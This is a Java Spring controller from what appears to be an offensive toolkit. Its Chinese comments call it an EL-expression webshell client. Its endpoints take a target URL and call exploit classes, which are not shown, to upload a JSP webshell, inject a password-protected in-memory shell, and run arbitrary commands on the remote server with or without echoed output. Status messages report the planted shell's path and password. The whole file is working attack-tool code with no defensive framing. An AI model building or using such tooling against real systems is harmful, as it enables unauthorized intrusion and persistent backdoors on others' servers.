package com.droplab.Controller.elShell;

import com.droplab.Controller.elShell.Service.NoResponseExec;
import com.droplab.Controller.elShell.Service.ResponseExec;
import com.droplab.Controller.elShell.Service.elShellMemoryShell;
import com.droplab.Controller.elShell.Service.elShellUploadShell;
import com.droplab.Utils.CommonUtils;
import org.jsoup.Connection;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.multipart.MultipartFile;

import java.io.File;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

/**
 * el表达式webshell客户端
 */
@Controller
@RequestMapping("/elshell")
public class elShellController {
    @RequestMapping(value = "/index", method = RequestMethod.GET)
    public String index(Model model) {
        CommonUtils.modelSet(new HashMap<>(), model);
        return "elShell/index.html";
    }

    /**
     * 基于自动寻址的webshell上传
     */
    @RequestMapping(value = "/elShellUploadShell",method = RequestMethod.POST)
    public String elShellUploadShell(Model model,
                                       @RequestParam(value = "files",required = true) List<MultipartFile> files,
                                       @RequestParam(value = "url", required = true) String url,
                                       @RequestParam(value = "rooturl", required = true) String rooturl,
                                       @RequestParam(value = "classname", required = false) String classname){
        try {
            if (rooturl.endsWith("/")) {
                rooturl = rooturl.substring(0, rooturl.length() - 1);
            }
            HashMap hashMap = new HashMap();
            String filename = CommonUtils.Random();
            hashMap.put("url",url);
            hashMap.put("rooturl",rooturl);
            hashMap.put("filename",filename);
            if(!classname.equals("") && classname!=null){
                hashMap.put("classname",classname);
            }
            if (!files.isEmpty()) {
                for (MultipartFile file : files) {
                    String rootPath = System.getProperty("java.io.tmpdir") + "//" + filename + ".tmp";
                    try {
                        File file1 = new File(rootPath);
                        file.transferTo(file1);
                        if (file1.exists()) {
                            hashMap.put("filepath", rootPath);
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
                elShellUploadShell elShellUploadShell = (com.droplab.Controller.elShell.Service.elShellUploadShell)Class.forName(getMap().get("elShellUploadShell")).newInstance();
                elShellUploadShell.setParams(hashMap);
                Connection.Response response = elShellUploadShell.exploit();
                if (response != null) {
                    HashMap<String, String> modelMap = new HashMap<>();
                    modelMap.put("elShellUploadShellurl", url);
                    modelMap.put("elShellUploadShell", new String(response.bodyAsBytes()));
                    modelMap.put("elShellUploadShelltips", String.format("如果写入成功，webshell路径：%s/%s.jsp",rooturl, filename));
                    CommonUtils.modelSet(modelMap, model);
                    return "elShell/index.html";
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        HashMap<String, String> modelMap = new HashMap<>();
        modelMap.put("elShellUploadShellurl", url);
        modelMap.put("elShellUploadShell", "请求出错，或参数传递不正确");
        CommonUtils.modelSet(modelMap, model);
        return "elShell/index.html";

    }


    /**
     * 任意代码执行
     */



    /**
     * 基于任意代码执行的内存马注入
     */
    @RequestMapping(value = "/elMemory", method = RequestMethod.POST)
    public String elMemory(Model model,
                                 @RequestParam(value = "url", required = true) String url,
                                 @RequestParam(value = "mType", required = true) String mType,
                                 @RequestParam(value = "mMiddle", required = true) String mMiddle,
                                 @RequestParam(value = "path", required = false) String path,
                                 @RequestParam(value = "mshellType", required = true) String mshellType,
                                 @RequestParam(value = "password", required = false) String password) {
        try {
            HashMap hashMap = new HashMap();
            hashMap.put("url", url);
            hashMap.put("mType",mType);
            hashMap.put("mMiddle",mMiddle);
            hashMap.put("path",path);
            hashMap.put("mshellType",mshellType);
            hashMap.put("password",password);
            elShellMemoryShell elshellMemoryShell = (elShellMemoryShell) Class.forName(getMap().get("elShellMemoryShell")).newInstance();
            elshellMemoryShell.setParams(hashMap);
            Connection.Response response = elshellMemoryShell.exploit();
            if (response != null) {
                HashMap<String, String> modelMap = new HashMap<>();
                String s = new String(response.bodyAsBytes());
                modelMap.put("elMemory",s);
                modelMap.put("elMemorytips", String.format("注入完成，自行尝试连接，path:%s   password:%s",path,password));
                CommonUtils.modelSet(modelMap, model);
                return "elShell/index.html";
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        HashMap<String, String> modelMap = new HashMap<>();
        modelMap.put("elMemory", "请求出错，或参数传递不正确");
        CommonUtils.modelSet(modelMap, model);
        return "elShell/index.html";

    }

    /**
     * 命令执行
     * 回显和不回显(回显是基于任意代码执行，非常不稳定，不一定成功)
     */
    @RequestMapping(value = "/elNoResponseExec",method = RequestMethod.POST)
    public String elNoResponseExec(Model model,
                                       @RequestParam(value = "url", required = true) String url,
                                       @RequestParam(value = "platform", required = true) String platform,
                                       @RequestParam(value = "cmd", required = true) String cmd){
        try {
            HashMap hashMap = new HashMap();
            hashMap.put("url",url);
            hashMap.put("platform",platform);
            hashMap.put("cmd",cmd);
            NoResponseExec noResponseExec = (NoResponseExec)Class.forName(getMap().get("elNoResponseExec")).newInstance();
            noResponseExec.setParams(hashMap);
            Connection.Response response = noResponseExec.exploit();
            if (response != null) {
                HashMap<String, String> modelMap = new HashMap<>();
                modelMap.put("elNoResponseExecurl", url);
                modelMap.put("elNoResponseExec", new String(response.bodyAsBytes()));
                modelMap.put("elNoResponseExecplatform", platform);
                CommonUtils.modelSet(modelMap, model);
                return "elShell/index.html";
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        HashMap<String, String> modelMap = new HashMap<>();
        modelMap.put("elNoResponseExecurl", url);
        modelMap.put("elNoResponseExec", "请求出错，或参数传递不正确");
        CommonUtils.modelSet(modelMap, model);
        return "elShell/index.html";

    }

    /**
     * 命令执行
     * 回显(回显是基于任意代码执行，非常不稳定，不一定成功)
     */
    @RequestMapping(value = "/elResponseExec",method = RequestMethod.POST)
    public String elResponseExec(Model model,
                                       @RequestParam(value = "url", required = true) String url,
                                       @RequestParam(value = "middle", required = true) String middle,
                                       @RequestParam(value = "cmd", required = true) String cmd){
        try {
            HashMap hashMap = new HashMap();
            hashMap.put("url",url);
            hashMap.put("middle",middle);
            hashMap.put("cmd",cmd);
            ResponseExec noResponseExec = (ResponseExec)Class.forName(getMap().get("elResponseExec")).newInstance();
            noResponseExec.setParams(hashMap);
            Connection.Response response = noResponseExec.exploit();
            if (response != null) {
                HashMap<String, String> modelMap = new HashMap<>();
                modelMap.put("elResponseExecurl", url);
                modelMap.put("elResponseExec", new String(response.bodyAsBytes()));
                modelMap.put("elResponseExecplatform", middle);
                CommonUtils.modelSet(modelMap, model);
                return "elShell/index.html";
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        HashMap<String, String> modelMap = new HashMap<>();
        modelMap.put("elResponseExecurl", url);
        modelMap.put("elResponseExec", "请求出错，或参数传递不正确");
        CommonUtils.modelSet(modelMap, model);
        return "elShell/index.html";

    }


    private Map<String, String> getMap() {
        HashMap<String, String> hashMap = new HashMap<>();
        hashMap.put("elShellUploadShell", "com.droplab.Controller.elShell.Service.elShellUploadShell");
        hashMap.put("elNoResponseExec", "com.droplab.Controller.elShell.Service.NoResponseExec");
        hashMap.put("elResponseExec", "com.droplab.Controller.elShell.Service.ResponseExec");
        hashMap.put("elShellMemoryShell", "com.droplab.Controller.elShell.Service.elShellMemoryShell");
        return hashMap;
    }
}
